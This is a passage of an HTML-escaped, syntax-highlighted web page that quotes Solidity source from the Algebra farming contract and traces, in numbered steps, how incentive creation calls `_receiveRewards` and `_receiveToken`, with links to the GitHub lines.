class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e == \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ezeroRewardAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) \u0026gt; (\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTickMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMAX_TICK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) - \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTickMath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eMIN_TICK\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)))\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eminimalPositionWidthTooWide\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPoolAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enewIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epluginAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econnectedPlugin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eEternalFarmingCreated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enonce\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminimalPositionWidth\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_addRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_setRewardRates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAlgebraEternalVirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualPool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eparams\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentiveId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"6\"\u003e\n\u003cli\u003eIt calls the \u003ccode\u003e_receiveRewards\u003c/code\u003e function \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L411\"\u003ehere\u003c/a\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentiveKey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIncentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estorage\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (!\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erevert\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereentrancyLock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efalse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// reentrancy lock\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ekey\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusRewardToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunlocked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etotalReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_totalRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eincentive\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_bonusRewardBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceivedBonusReward\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"7\"\u003e\n\u003cli\u003eIt calls the \u003ccode\u003e_receiveToken\u003c/code\u003e function \u003ca href=\"https://github.com/cryptoalgebra/Algebra/blob/f9a0eff66e2e6d3b9c2b794612cd382aaca8f181/src/farming/contracts/farmings/AlgebraEternalFarming.sol#L428\"\u003ehere\u003c/a\u003e: \u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e  \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_receiveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20Minimal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint128\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eTransferHelper\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esafeTransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003emsg\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esender\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk4\"\u003ethis\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getBalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eunchecked\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e      \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceived\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceAfter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalanceBefore\u003c/span\u003e\u003cspan 